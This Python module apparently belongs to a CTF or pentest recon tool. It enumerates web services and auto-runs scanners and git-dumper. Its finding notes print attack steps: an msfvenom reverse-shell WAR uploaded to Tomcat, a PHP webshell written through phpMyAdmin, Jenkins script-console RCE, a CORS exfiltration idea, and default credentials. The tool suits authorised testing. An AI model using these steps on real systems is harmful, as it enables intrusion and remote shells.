import json
import re
import subprocess
from pathlib import Path
from urllib.parse import urlparse

from lib.findings import FindingsSink as Findings
from lib.hosts import HostsManager
from lib.models import Discovery, Service
from lib.runner import Runner
from lib.scope import Scope

# SecLists paths
_WORDLIST_DIRS       = "/usr/share/seclists/Discovery/Web-Content/common.txt"
_WORDLIST_DIRS_SMALL = "/usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt"
_WORDLIST_VHOST      = "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
_WORDLIST_API        = "/usr/share/seclists/Discovery/Web-Content/api/objects.txt"

# ffuf tuning — conservative for CTF targets
_FFUF_THREADS  = 20       # lower than before to avoid tripping rate limits / crashing services
_FFUF_TIMEOUT  = "180"    # seconds total per ffuf run (3 min is enough for common.txt at 20 threads)
_REQ_TIMEOUT   = "10"     # per-request timeout

# ANSI escape sequence pattern
_ANSI_RE = re.compile(r"\x1b\[[0-9;]*[mKGHFABCDJsu]")

# ffuf result line: "path    [Status: 200, Size: 1234, ...]"
_FFUF_RE = re.compile(r"^(\S+)\s+\[Status:\s*(\d+),\s*Size:\s*(\d+).*?\]", re.MULTILINE)

# Patterns that look like secrets embedded in JS source
_JS_SECRET_RE = re.compile(
    r'(?:api[_-]?key|apikey|api[_-]?secret|client[_-]?secret|access[_-]?token|'
    r'auth[_-]?token|secret[_-]?key|private[_-]?key|password|passwd|bearer|jwt|'
    r'x-api-key|Authorization)\s*[=:]\s*["\']([^"\']{8,80})["\']',
    re.IGNORECASE,
)

# Paths that indicate sensitive content if they return 200
_SENSITIVE_PATHS = [
    ("/.git/HEAD",             ".git exposed (use git-dumper)"),
    ("/.git/config",           ".git/config exposed"),
    ("/.env",                  ".env file exposed"),
    ("/.htpasswd",             ".htpasswd exposed"),
    ("/web.config",            "web.config exposed"),
    ("/phpinfo.php",           "phpinfo.php exposed"),
    ("/server-status",         "Apache server-status enabled"),
    ("/.svn/entries",          "SVN repository exposed"),
    ("/WEB-INF/web.xml",       "WEB-INF/web.xml exposed"),
    ("/.DS_Store",             ".DS_Store exposed"),
    ("/crossdomain.xml",       "crossdomain.xml (Flash policy)"),
    ("/clientaccesspolicy.xml","clientaccesspolicy.xml (Silverlight policy)"),
    ("/backup.zip",            "backup.zip exposed"),
    ("/backup.tar.gz",         "backup.tar.gz exposed"),
    ("/.git/COMMIT_EDITMSG",   ".git/COMMIT_EDITMSG exposed"),
]

# ADCS web enrollment endpoints
_ADCS_PATHS = [
    "/certsrv",
    "/certsrv/certnew.asp",
    "/certenroll",
    "/certsrv/mscep/mscep.dll",
    "/ADPolicyProvider_CEP_UsernamePassword/service.svc",
]

# Jenkins paths — 200/403 means Jenkins is running
_JENKINS_PATHS = [
    ("/manage",         "Management interface"),
    ("/script",         "Script console (RCE if 200)"),
    ("/asynchPeople/",  "User list"),
    ("/systemInfo",     "System info"),
    ("/api/json",       "REST API"),
]

# Tomcat manager paths
_TOMCAT_PATHS = [
    ("/manager/html",         "Tomcat Manager"),
    ("/manager/text",         "Tomcat Manager (text)"),
    ("/host-manager/html",    "Tomcat Host Manager"),
]

# phpMyAdmin paths
_PMA_PATHS = [
    "/phpmyadmin", "/pma", "/phpMyAdmin", "/dbadmin", "/db/phpmyadmin",
    "/admin/phpmyadmin", "/mysql", "/phpma",
]

# Splunk login paths
_SPLUNK_PATHS = [
    "/en-US/account/login",
    "/en-GB/account/login",
]

# GraphQL endpoint paths
_GRAPHQL_PATHS = [
    "/graphql", "/api/graphql", "/v1/graphql", "/graphiql",
    "/playground", "/api/v1/graphql", "/api/v2/graphql",
]

# Security header flags for assessment
_SEC_HEADERS = {
    "strict-transport-security": "HSTS",
    "x-frame-options":           "X-Frame-Options",
    "content-security-policy":   "CSP",
    "x-content-type-options":    "X-Content-Type-Options",
    "permissions-policy":        "Permissions-Policy",
}


def enumerate_web(
    ip: str,
    service: Service,
    domain: str | None,
    runner: Runner,
    findings: Findings,
    scope: Scope,
    hosts: HostsManager,
    available: set[str],
    is_followup: bool = False,
    deep: bool = False,
) -> list[Discovery]:
    """
    Web enumeration for one port/hostname.

    Fast mode (default): fingerprint → sensitive files → targeted app probes →
    single dir bust → vhost bust → crawl.

    Deep mode (--deep): additionally runs cewl+dir bust, arjun param discovery,
    and the full API endpoint scanner.
    """
    port = service.port
    scheme = service.scheme
    hostname = service.hostname or (domain if domain and not is_followup else ip)
    base_url = _build_url(scheme, hostname, port)

    tag = f"TCP {port} — {scheme.upper()}"
    if hostname != ip:
        tag += f" ({hostname})"
    findings.h3(tag)
    print(f"[*] Web — {base_url}" + ("  [deep]" if deep else ""))

    discoveries: list[Discovery] = []

    # ── 1. Headers + tech fingerprint ─────────────────────────────────────────
    print(f"    → fingerprint")
    fp = _fingerprint(base_url, runner, findings, available)

    # ── 2. NTLM info disclosure — only probe IIS/Windows endpoints (saves ~10s/port on Linux) ──
    _check_ntlm_info(ip, port, runner, findings, server_hint=fp.get("server", ""))

    # Microsoft-HTTPAPI: WinRM/RPC-over-HTTP — no web content to enumerate
    if "microsoft-httpapi" in fp["server"].lower():
        findings.note(
            f"Microsoft-HTTPAPI endpoint — no web content to enumerate. "
            f"WinRM: `evil-winrm -i {ip} -u USER -p PASS`"
        )
        return discoveries

    # ── 3. HTTP method probe ───────────────────────────────────────────────────
    _check_http_methods(base_url, runner, findings)

    # ── 4. CORS misconfiguration check ────────────────────────────────────────
    _check_cors(base_url, runner, findings)

    # ── 5. Redirect detection (IP → domain) ───────────────────────────────────
    if not is_followup:
        redirect_host = _detect_redirect(ip, port, scheme)
        if redirect_host and redirect_host != ip and scope.check(redirect_host):
            findings.bullet(f"**Redirect:** `{_build_url(scheme, ip, port)}` → `{redirect_host}`")
            discoveries.append(Discovery(
                type="redirect", hostname=redirect_host,
                port=port, scheme=scheme, source=f"HTTP redirect on port {port}",
            ))

    # ── 6. robots.txt ─────────────────────────────────────────────────────────
    _fetch_robots(base_url, runner, findings)

    # ── 7. Sensitive file probes ───────────────────────────────────────────────
    _check_sensitive_files(base_url, runner, findings, available)

    # ── 8. SSL cert — extract CN / SANs ───────────────────────────────────────
    if scheme == "https":
        ssl_names = _extract_ssl_names(ip, port, runner, findings)
        for name in ssl_names:
            if name != hostname and scope.check(name):
                discoveries.append(Discovery(
                    type="ssl_san", hostname=name,
                    port=port, scheme="https", source=f"SSL certificate on port {port}",
                ))

    # ── 9. testssl.sh ─────────────────────────────────────────────────────────
    if scheme == "https" and "testssl.sh" in available:
        _run_testssl(ip, port, runner, findings)

    # ── 10. ADCS probe ────────────────────────────────────────────────────────
    _check_adcs(base_url, ip, runner, findings)

    # ── 11. Next.js ───────────────────────────────────────────────────────────
    if fp.get("is_nextjs"):
        print(f"    → Next.js enumeration")
        _check_nextjs(base_url, runner, findings)

    # ── 12. WordPress ─────────────────────────────────────────────────────────
    if "wpscan" in available:
        _wpscan(base_url, runner, findings)

    # ── 13. CMS detection — Joomla + Drupal ───────────────────────────────────
    _check_cms(base_url, runner, findings, available)

    # ── 14. Jenkins ───────────────────────────────────────────────────────────
    _check_jenkins(base_url, runner, findings)

    # ── 15. Tomcat manager ────────────────────────────────────────────────────
    _check_tomcat(base_url, ip, runner, findings)

    # ── 16. phpMyAdmin ────────────────────────────────────────────────────────
    _check_phpmyadmin(base_url, runner, findings)

    # ── 17. Splunk ────────────────────────────────────────────────────────────
    _check_splunk(base_url, runner, findings)

    # ── 18. GraphQL ───────────────────────────────────────────────────────────
    _check_graphql(base_url, runner, findings)

    # ── 19. Directory bust ────────────────────────────────────────────────────
    if "ffuf" in available:
        print(f"    → dir bust")
        _dir_bust(base_url, runner, findings, fp)

    # ── 20. API endpoint discovery (deep only) ────────────────────────────────
    if deep and "ffuf" in available:
        print(f"    → API bust (deep)")
        _api_bust(base_url, runner, findings)

    # ── 21. cewl + targeted dir bust (deep only) ──────────────────────────────
    if deep and "cewl" in available and "ffuf" in available:
        print(f"    → cewl wordlist (deep)")
        cewl_wl = _run_cewl(base_url, runner, findings)
        if cewl_wl:
            _dir_bust_cewl(base_url, cewl_wl, runner, findings, fp)

    # ── 22. Parameter discovery (deep only) ───────────────────────────────────
    if deep and "arjun" in available:
        _param_fuzz(base_url, runner, findings)

    # ── 23. Vhost bust ────────────────────────────────────────────────────────
    if not is_followup and domain and "ffuf" in available:
        print(f"    → vhost bust")
        vhosts = _vhost_bust(ip, port, scheme, domain, runner, findings)
        for vh in vhosts:
            if scope.check(vh):
                discoveries.append(Discovery(
                    type="vhost", hostname=vh,
                    port=port, scheme=scheme, source=f"ffuf vhost bust port {port}",
                ))

    # ── 24. Crawl ─────────────────────────────────────────────────────────────
    if "gospider" in available:
        print(f"    → crawl")
        _crawl(base_url, scope, runner, findings)

    return discoveries


# ── Fingerprint ───────────────────────────────────────────────────────────────

def _fingerprint(url: str, runner: Runner, findings: Findings, available: set[str]) -> dict:
    findings.h4("Fingerprint")

    cmd = ["curl", "-sS", "-k", "-I", "-L", "--max-time", "15", url]
    out = runner.run(cmd, f"web_{_label(url)}_headers")
    findings.cmd(" ".join(cmd))
    _parse_interesting_headers(out, findings)

    meta = _parse_headers_meta(out)

    # Skip whatweb on HTTPAPI — it always times out on WinRM/RPC endpoints
    if "whatweb" in available and "microsoft-httpapi" not in meta["server"].lower():
        cmd2 = ["whatweb", "--no-errors", "-a", "3", url]
        out2 = runner.run(cmd2, f"web_{_label(url)}_whatweb", timeout=60)
        findings.cmd(" ".join(cmd2))
        clean = _ANSI_RE.sub("", out2).strip()
        if clean:
            findings.code_block(clean)

    return meta


def _parse_headers_meta(raw: str) -> dict:
    meta = {"status": "", "server": "", "powered_by": "", "is_nextjs": False, "is_php": False}
    for line in raw.splitlines():
        if line.startswith("HTTP/"):
            parts = line.split()
            if len(parts) >= 2:
                meta["status"] = parts[1]
        elif ":" in line:
            key, _, val = line.partition(":")
            k = key.strip().lower()
            v = val.strip()
            if k == "server":
                meta["server"] = v
            elif k == "x-powered-by":
                meta["powered_by"] = v
                if "next.js" in v.lower():
                    meta["is_nextjs"] = True
                if "php" in v.lower():
                    meta["is_php"] = True
            elif k.startswith("x-nextjs"):
                meta["is_nextjs"] = True
    return meta


def _parse_interesting_headers(raw: str, findings: Findings):
    interesting = {
        "server", "x-powered-by", "x-aspnet-version", "x-aspnetmvc-version",
        "location", "set-cookie", "www-authenticate", "content-security-policy",
        "x-frame-options", "access-control-allow-origin",
    }
    seen_sec: set[str] = set()
    for line in raw.splitlines():
        if ":" in line:
            key = line.split(":", 1)[0].strip().lower()
            if key in interesting:
                findings.bullet(f"`{line.strip()}`")
            if key in _SEC_HEADERS:
                seen_sec.add(key)
            # Flag insecure cookie attributes
            if key == "set-cookie":
                val = line.lower()
                issues = []
                if "httponly" not in val:
                    issues.append("missing HttpOnly")
                if "secure" not in val:
                    issues.append("missing Secure")
                if "samesite" not in val:
                    issues.append("missing SameSite")
                if issues:
                    findings.note(f"Cookie flags: {', '.join(issues)} — `{line.strip()}`")

    # Report missing security headers (HTTPS context implied if any are present)
    missing = [label for hdr, label in _SEC_HEADERS.items() if hdr not in seen_sec]
    if missing and "HTTP/" in raw:
        findings.note(f"Missing security headers: {', '.join(missing)}")


# ── NTLM info disclosure ──────────────────────────────────────────────────────

def _check_ntlm_info(ip: str, port: int, runner: Runner, findings: Findings,
                     server_hint: str = ""):
    """
    nmap http-ntlm-info — leaks NetBIOS name, DNS domain, product version.
    Only probes IIS/Windows endpoints — skip on nginx/Apache/etc to save ~10s per port.
    """
    _windows_markers = ("iis", "microsoft", "asp", "httpapi", "windows", "iisexpress")
    if not any(m in server_hint.lower() for m in _windows_markers):
        return

    cmd = ["nmap", "--script", "http-ntlm-info", "-p", str(port), ip]
    out = runner.run(cmd, f"web_{ip}_{port}_ntlm_info", timeout=30)
    ntlm_fields = ("NetBIOS_Computer_Name", "NetBIOS_Domain_Name",
                   "DNS_Computer_Name", "DNS_Domain_Name", "Product_Version")
    hits = [l.strip() for l in out.splitlines()
            if any(f in l for f in ntlm_fields)]
    if hits:
        findings.h4("NTLM Info Disclosure")
        findings.cmd(" ".join(cmd))
        for line in hits:
            findings.bullet(f"`{line}`")


# ── HTTP method probe ─────────────────────────────────────────────────────────

def _check_http_methods(url: str, runner: Runner, findings: Findings):
    result = subprocess.run(
        ["curl", "-sk", "--max-time", "10", "-X", "OPTIONS", "-I", url],
        capture_output=True, text=True,
    )
    for line in result.stdout.splitlines():
        key = line.split(":", 1)[0].strip().lower()
        if key in ("allow", "access-control-allow-methods", "public"):
            methods = line.split(":", 1)[1].strip()
            dangerous = [m for m in ("PUT", "DELETE", "TRACE", "PATCH", "CONNECT")
                         if m in methods.upper()]
            if dangerous:
                findings.bullet(f"**Dangerous HTTP methods allowed:** `{', '.join(dangerous)}` (from `{methods}`)")
            else:
                findings.bullet(f"HTTP methods: `{methods}`")
            return


# ── Redirect detection ────────────────────────────────────────────────────────

def _detect_redirect(ip: str, port: int, scheme: str) -> str | None:
    url = _build_url(scheme, ip, port)
    result = subprocess.run(
        ["curl", "-sS", "-k", "-L", "--max-time", "15",
         "-o", "/dev/null", "-w", "%{url_effective}", url],
        capture_output=True, text=True,
    )
    effective = result.stdout.strip()
    if not effective:
        return None
    host = urlparse(effective).hostname or ""
    return host if host != ip else None


# ── robots.txt ────────────────────────────────────────────────────────────────

def _fetch_robots(base_url: str, runner: Runner, findings: Findings):
    result = subprocess.run(
        ["curl", "-sk", "--max-time", "10", "-o", "/dev/null",
         "-w", "%{http_code}", f"{base_url}/robots.txt"],
        capture_output=True, text=True,
    )
    if result.stdout.strip() not in ("200", "301", "302"):
        return

    cmd = ["curl", "-sS", "-k", "--max-time", "10", f"{base_url}/robots.txt"]
    out = runner.run(cmd, f"web_{_label(base_url)}_robots")
    if out.strip():
        findings.h4("robots.txt")
        findings.cmd(" ".join(cmd))
        findings.code_block(out.strip())


# ── Sensitive file probes ─────────────────────────────────────────────────────

def _check_sensitive_files(base_url: str, runner: Runner, findings: Findings,
                           available: set[str]):
    found: list[tuple[str, str]] = []
    for path, label in _SENSITIVE_PATHS:
        result = subprocess.run(
            ["curl", "-sk", "--max-time", "8", "-o", "/dev/null",
             "-w", "%{http_code}", f"{base_url}{path}"],
            capture_output=True, text=True,
        )
        if result.stdout.strip() == "200":
            found.append((path, label))

    if found:
        findings.h4("Sensitive Files")
        for path, label in found:
            findings.bullet(f"**{label}**: `{base_url}{path}`")
            findings.add_summary(f"**{label}** exposed at `{base_url}{path}`")
            if ".git/HEAD" in path and "git-dumper" in available:
                git_out_dir = str(runner.ws.loot_dir / f"git_dump_{_label(base_url)}")
                cmd = ["git-dumper", f"{base_url}/.git/", git_out_dir]
                findings.cmd(" ".join(cmd))
                runner.run(cmd, f"web_{_label(base_url)}_git_dumper", timeout=300)
                findings.bullet(f"  git-dumper output: `{git_out_dir}`")


# ── SSL certificate ───────────────────────────────────────────────────────────

def _extract_ssl_names(ip: str, port: int, runner: Runner, findings: Findings) -> list[str]:
    cmd = ["openssl", "s_client", "-connect", f"{ip}:{port}",
           "-servername", ip, "-showcerts"]
    out = runner.run(cmd, f"web_{ip}_{port}_ssl_cert", timeout=15)

    cert_pem = _extract_pem(out)
    if not cert_pem:
        return []

    result = subprocess.run(
        ["openssl", "x509", "-noout", "-text"],
        input=cert_pem, capture_output=True, text=True,
    )
    cert_text = result.stdout

    names: list[str] = []
    cn = re.search(r"Subject:.*?CN\s*=\s*([^\s,/]+)", cert_text)
    if cn:
        names.append(cn.group(1).lstrip("*."))
    for m in re.finditer(r"DNS:([^\s,]+)", cert_text):
        names.append(m.group(1).lstrip("*."))

    unique = list(dict.fromkeys(n for n in names if n))
    if unique:
        findings.h4("SSL Certificate")
        for n in unique:
            findings.bullet(f"CN/SAN: `{n}`")

    return unique


def _extract_pem(openssl_out: str) -> str:
    start = openssl_out.find("-----BEGIN CERTIFICATE-----")
    end = openssl_out.find("-----END CERTIFICATE-----")
    if start == -1 or end == -1:
        return ""
    return openssl_out[start: end + len("-----END CERTIFICATE-----")]


# ── testssl.sh ────────────────────────────────────────────────────────────────

def _run_testssl(ip: str, port: int, runner: Runner, findings: Findings):
    findings.h4("testssl.sh")
    cmd = ["testssl.sh", "--color", "0", "--quiet", "--fast", f"{ip}:{port}"]
    findings.cmd(" ".join(cmd))
    out = runner.run(cmd, f"web_{ip}_{port}_testssl", timeout=300)

    flag_keywords = (
        "VULNERABLE", "HIGH", "MEDIUM", "NOT ok", "WARN",
        "BEAST", "POODLE", "SWEET32", "CRIME", "BREACH",
        "DROWN", "LOGJAM", "FREAK", "LUCKY13",
    )
    hits = [l.strip() for l in out.splitlines()
            if any(kw in l for kw in flag_keywords) and l.strip()]
    if hits:
        findings.bullet("**testssl findings:**")
        for line in hits[:20]:
            findings.bullet(f"  {line}")


# ── CORS misconfiguration ────────────────────────────────────────────────────

def _check_cors(base_url: str, runner: Runner, findings: Findings):
    """Check for CORS misconfiguration — reflected origin with credentials."""
    result = subprocess.run(
        ["curl", "-sk", "--max-time", "10", "-H", "Origin: https://evil-p0rtix.com",
         "-I", base_url],
        capture_output=True, text=True,
    )
    acao = ""
    acac = ""
    for line in result.stdout.splitlines():
        ll = line.lower()
        if "access-control-allow-origin" in ll:
            acao = line.strip()
        if "access-control-allow-credentials" in ll:
            acac = line.strip()
    if not acao:
        return
    if "evil-p0rtix.com" in acao or acao.endswith("*"):
        severity = "**CORS: wildcard or reflected origin**" if "*" in acao else "**CORS: origin reflected**"
        findings.h4("CORS Misconfiguration")
        findings.bullet(f"{severity}: `{acao}`")
        if acac:
            findings.bullet(f"  `{acac}`")
        if "evil-p0rtix.com" in acao and "true" in acac.lower():
            findings.add_summary(f"**CORS: credentialed cross-origin read** at `{base_url}`")
            findings.note(
                "Exploit: victim must be authenticated to target. "
                "Host JS that calls `fetch(target_url, {credentials:'include'})` and exfils response."
            )
        else:
            findings.add_summary(f"CORS misconfiguration at `{base_url}`")


# ── Tomcat manager probe ──────────────────────────────────────────────────────

def _check_tomcat(base_url: str, ip: str, runner: Runner, findings: Findings):
    """Detect Tomcat manager — 401 = exists, 200 = no auth."""
    found: list[tuple[str, str, str]] = []
    for path, label in _TOMCAT_PATHS:
        r = subprocess.run(
            ["curl", "-sk", "--max-time", "8", "-o", "/dev/null",
             "-w", "%{http_code}", f"{base_url}{path}"],
            capture_output=True, text=True,
        )
        code = r.stdout.strip()
        if code in ("200", "401", "403", "302"):
            found.append((path, label, code))

    if not found:
        return

    findings.h4("Apache Tomcat")
    for path, label, code in found:
        if code == "200":
            findings.bullet(f"**{label} ACCESSIBLE (no auth):** `{base_url}{path}`")
            findings.add_summary(f"**Tomcat manager open (no auth)** at `{base_url}{path}` — WAR upload = RCE")
        elif code == "401":
            findings.bullet(f"**{label}:** `{base_url}{path}` — HTTP 401 (auth required)")
            findings.add_summary(f"Tomcat manager at `{base_url}{path}` — try default creds")
        else:
            findings.bullet(f"{label}: `{base_url}{path}` — HTTP {code}")

    if any(c in ("200", "401") for _, _, c in found):
        findings.note(
            "Default creds: tomcat:tomcat, admin:admin, tomcat:s3cret, admin:s3cret, manager:manager. "
            "With access: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f war -o shell.war` "
            f"→ `curl -u admin:admin {base_url}/manager/text/deploy?path=/shell --upload-file shell.war` "
            f"→ `curl {base_url}/shell/`"
        )


# ── phpMyAdmin probe ──────────────────────────────────────────────────────────

def _check_phpmyadmin(base_url: str, runner: Runner, findings: Findings):
    """Detect phpMyAdmin installation."""
    for path in _PMA_PATHS:
        r = subprocess.run(
            ["curl", "-sk", "--max-time", "8", "-o", "/dev/null",
             "-w", "%{http_code}", f"{base_url}{path}"],
            capture_output=True, text=True,
        )
        code = r.stdout.strip()
        if code in ("200", "302"):
            findings.h4("phpMyAdmin")
            findings.bullet(f"**phpMyAdmin detected:** `{base_url}{path}`")
            findings.add_summary(f"phpMyAdmin at `{base_url}{path}` — try root/'', root/root, root/toor")
            findings.note(
                "With access: `SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'` "
                "(requires FILE privilege + write access to webroot)"
            )
            return


# ── Splunk probe ──────────────────────────────────────────────────────────────

def _check_splunk(base_url: str, runner: Runner, findings: Findings):
    """Detect Splunk Web — default creds: admin/changeme."""
    for path in _SPLUNK_PATHS:
        r = subprocess.run(
            ["curl", "-sk", "--max-time", "8", "-o", "/dev/null",
             "-w", "%{http_code}", f"{base_url}{path}"],
            capture_output=True, text=True,
        )
        if r.stdout.strip() in ("200", "302", "301"):
            findings.h4("Splunk")
            findings.bullet(f"**Splunk Web detected:** `{base_url}{path}`")
            findings.add_summary(f"Splunk at `{base_url}` — default: admin/changeme. UF on 8089 = RCE via app")
            findings.note(
                "Test default creds: admin/changeme. "
                "Admin access on Universal Forwarder (port 8089) → deploy malicious app → RCE as SYSTEM. "
                "Tool: SplunkWhisperer2 / PySplunkWhisperer2_remote.py"
            )
            return


# ── GraphQL probe ─────────────────────────────────────────────────────────────

def _check_graphql(base_url: str, runner: Runner, findings: Findings):
    """Detect GraphQL endpoint and attempt introspection."""
    for path in _GRAPHQL_PATHS:
        r = subprocess.run(
            ["curl", "-sk", "--max-time", "8",
             "-X", "POST", "-H", "Content-Type: application/json",
             "-d", '{"query":"{__typename}"}',
             "-w", "\n%{http_code}",
             f"{base_url}{path}"],
            capture_output=True, text=True,
        )
        lines = r.stdout.rsplit("\n", 1)
        code = lines[-1].strip() if len(lines) > 1 else "000"
        body = lines[0] if len(lines) > 1 else r.stdout

        if code not in ("200", "400") or not body.strip():
            continue
        if "__typename" not in body and "errors" not in body.lower() and "graphql" not in body.lower():
            continue

        findings.h4("GraphQL")
        findings.bullet(f"**GraphQL endpoint:** `{base_url}{path}`")
        findings.add_summary(f"GraphQL at `{base_url}{path}` — probe for introspection and injection")

        # Attempt introspection
        r2 = subprocess.run(
            ["curl", "-sk", "--max-time", "10",
             "-X", "POST", "-H", "Content-Type: application/json",
             "-d", '{"query":"{__schema{types{name}}}"}',
             f"{base_url}{path}"],
            capture_output=True, text=True,
        )
        if "__schema" in r2.stdout:
            findings.bullet("**Introspection enabled** — full schema accessible")
            findings.note(
                f"Dump schema: "
                f'`curl -X POST {base_url}{path} -H "Content-Type: application/json" '
                f"-d '{{\\\"query\\\":\\\"{{__schema{{types{{name,fields{{name}}}}}}}}\\\"}}' | python3 -m json.tool`"
            )
        else:
            findings.bullet("Introspection disabled — probe field suggestions with typos")
            findings.note(
                f'Field suggestion probe: `curl -X POST {base_url}{path} '
                f'-H "Content-Type: application/json" -d \'{{\"query\":\"{{ usr {{ id }} }}\"}}\' `'
                " — look for 'Did you mean' in response"
            )
        return


# ── ADCS probe ────────────────────────────────────────────────────────────────

def _check_adcs(base_url: str, ip: str, runner: Runner, findings: Findings):
    found: list[tuple[str, str]] = []
    for path in _ADCS_PATHS:
        result = subprocess.run(
            ["curl", "-sk", "--max-time", "8", "-o", "/dev/null",
             "-w", "%{http_code}", f"{base_url}{path}"],
            capture_output=True, text=True,
        )
        code = result.stdout.strip()
        if code in ("200", "301", "302", "401", "403"):
            found.append((path, code))

    if found:
        findings.h4("ADCS (AD Certificate Services)")
        findings.bullet("**ADCS web enrollment detected!**")
        findings.add_summary(f"**ADCS web enrollment** at `{base_url}` — check ESC1-8")
        for path, code in found:
            findings.bullet(f"  `{base_url}{path}` — HTTP {code}")
        findings.note(
            f"Check for ESC1-8 vulnerabilities: "
            f"`certipy-ad find -u USER@DOMAIN -p PASS -dc-ip {ip} -vulnerable -stdout`"
        )


# ── WordPress ─────────────────────────────────────────────────────────────────

def _wpscan(base_url: str, runner: Runner, findings: Findings):
    result = subprocess.run(
        ["curl", "-sk", "--max-time", "10", "-o", "/dev/null",
         "-w", "%{http_code}", f"{base_url}/wp-login.php"],
        capture_output=True, text=True,
    )
    if result.stdout.strip() not in ("200", "302"):
        return

    findings.h4("WordPress (wpscan)")
    cmd = ["wpscan", "--url", base_url, "--enumerate", "p,u,t,cb,dbe",
           "--no-banner", "--disable-tls-checks"]
    findings.cmd(" ".join(cmd))
    out = runner.run(cmd, f"web_{_label(base_url)}_wpscan", timeout=300)

    for line in out.splitlines():
        if any(kw in line for kw in ("[!]", "[+]", "vulnerability", "Vulnerability",
                                      "Username", "version")):
            findings.bullet(line.strip())


# ── CMS detection — Joomla + Drupal ─────────────────────────────────────────

def _check_cms(base_url: str, runner: Runner, findings: Findings, available: set[str]):
    # Joomla — admin panel at /administrator/
    r = subprocess.run(
        ["curl", "-sk", "--max-time", "10", "-o", "/dev/null",
         "-w", "%{http_code}", f"{base_url}/administrator/"],
        capture_output=True, text=True,
    )
    if r.stdout.strip() in ("200", "302", "301"):
        findings.h4("CMS: Joomla")
        findings.bullet(f"**Joomla admin panel:** `{base_url}/administrator/`")
        if "joomscan" in available:
            cmd = ["joomscan", "--url", base_url]
            findings.cmd(" ".join(cmd))
            out = runner.run(cmd, f"web_{_label(base_url)}_joomscan", timeout=300)
            for line in out.splitlines():
                if any(kw in line for kw in ("[++]", "[+]", "Vulnerable", "CVE", "version",
                                              "Admin", "Interesting")):
                    findings.bullet(line.strip())

    # Drupal — multiple indicators
    drupal_indicators = [
        ("/CHANGELOG.txt",           "Drupal CHANGELOG.txt"),
        ("/misc/drupal.js",          "Drupal JS asset"),
        ("/sites/default/settings.php", "Drupal settings.php"),
        ("/core/CHANGELOG.txt",      "Drupal 8+ CHANGELOG"),
    ]
    drupal_found = False
    for path, label in drupal_indicators:
        r2 = subprocess.run(
            ["curl", "-sk", "--max-time", "8", "-o", "/dev/null",
             "-w", "%{http_code}", f"{base_url}{path}"],
            capture_output=True, text=True,
        )
        if r2.stdout.strip() == "200":
            if not drupal_found:
                findings.h4("CMS: Drupal")
                drupal_found = True
            findings.bullet(f"**{label}:** `{base_url}{path}`")

    if drupal_found and "droopescan" in available:
        cmd2 = ["droopescan", "scan", "drupal", "--url", base_url]
        findings.cmd(" ".join(cmd2))
        out2 = runner.run(cmd2, f"web_{_label(base_url)}_droopescan", timeout=300)
        for line in out2.splitlines():
            if line.strip() and not line.startswith("[*] Scanning"):
                findings.bullet(line.strip())


# ── Jenkins probe ─────────────────────────────────────────────────────────────

def _check_jenkins(base_url: str, runner: Runner, findings: Findings):
    """Probe for exposed Jenkins endpoints — /script console = unauthenticated RCE."""
    found: list[tuple[str, str, str]] = []
    for path, label in _JENKINS_PATHS:
        r = subprocess.run(
            ["curl", "-sk", "--max-time", "8", "-o", "/dev/null",
             "-w", "%{http_code}", f"{base_url}{path}"],
            capture_output=True, text=True,
        )
        code = r.stdout.strip()
        if code in ("200", "302", "301", "403"):
            found.append((path, label, code))

    if not found:
        return

    # Confirm it's actually Jenkins, not a coincidental 200
    r_check = subprocess.run(
        ["curl", "-sk", "--max-time", "10", base_url],
        capture_output=True, text=True,
    )
    if "Jenkins" not in r_check.stdout and "hudson" not in r_check.stdout.lower():
        return

    findings.h4("Jenkins")
    for path, label, code in found:
        if code == "200" and path in ("/script", "/manage"):
            findings.bullet(f"**{label} ACCESSIBLE (HTTP {code}):** `{base_url}{path}`")
        else:
            findings.bullet(f"{label}: `{base_url}{path}` — HTTP {code}")

    if any(p == "/script" and c == "200" for p, _, c in found):
        findings.bullet("**CRITICAL: Script console accessible without auth — RCE**")
        findings.add_summary(f"**CRITICAL: Jenkins /script RCE** at `{base_url}/script`")
        findings.note(
            f"Execute OS commands: POST to `{base_url}/script` with "
            f"`script=println(['id'].execute().text)`"
        )
    if any(p == "/api/json" and c == "200" for p, _, c in found):
        findings.bullet("**Jenkins REST API accessible (no auth)** — enum jobs/builds")


# ── Next.js enumeration ───────────────────────────────────────────────────────

def _check_nextjs(base_url: str, runner: Runner, findings: Findings):
    """Extract Next.js build ID, probe _next/data routes, and dump __NEXT_DATA__."""
    findings.h4("Next.js")

    result = subprocess.run(
        ["curl", "-sk", "--max-time", "15", base_url],
        capture_output=True, text=True,
    )
    html = result.stdout

    # Build ID — unlocks /_next/data/<buildId>/<page>.json routes
    build_id: str | None = None
    m = re.search(r'"buildId"\s*:\s*"([^"]+)"', html)
    if m:
        build_id = m.group(1)
        findings.bullet(f"Build ID: `{build_id}`")

    # Inline __NEXT_DATA__ JSON — contains props/pageProps passed to the page
    m_data = re.search(r'<script id="__NEXT_DATA__"[^>]*>(.*?)</script>', html, re.DOTALL)
    if m_data:
        try:
            nd = json.loads(m_data.group(1))
            findings.bullet("**`__NEXT_DATA__`** present — inline page state:")
            for key in ("props", "pageProps", "query", "runtimeConfig"):
                val = nd.get(key)
                if val:
                    findings.bullet(f"  `{key}`: {str(val)[:300]}")
        except Exception:
            pass

    # Probe /_next/data/<buildId>/index.json — pre-rendered page payload
    if build_id:
        data_url = f"{base_url}/_next/data/{build_id}/index.json"
        r = subprocess.run(
            ["curl", "-sk", "--max-time", "10", "-w", "\n%{http_code}", data_url],
            capture_output=True, text=True,
        )
        lines = r.stdout.rsplit("\n", 1)
        code = lines[-1].strip() if len(lines) > 1 else "000"
        body = lines[0] if len(lines) > 1 else r.stdout
        if code == "200":
            findings.bullet(f"**Pre-rendered data exposed:** `/_next/data/{build_id}/index.json`")
            findings.add_summary(f"Next.js pre-rendered data at `/_next/data/{build_id}/index.json`")
            if body.strip():
                findings.code_block(body[:800])

    # Check accessibility of standard Next.js paths
    for path in ("/_next/static/", "/_next/data/"):
        r2 = subprocess.run(
            ["curl", "-sk", "--max-time", "8", "-o", "/dev/null",
             "-w", "%{http_code}", f"{base_url}{path}"],
            capture_output=True, text=True,
        )
        code2 = r2.stdout.strip()
        if code2 not in ("404", "000", ""):
            findings.bullet(f"`{path}` — HTTP {code2}")


# ── Directory bust ────────────────────────────────────────────────────────────

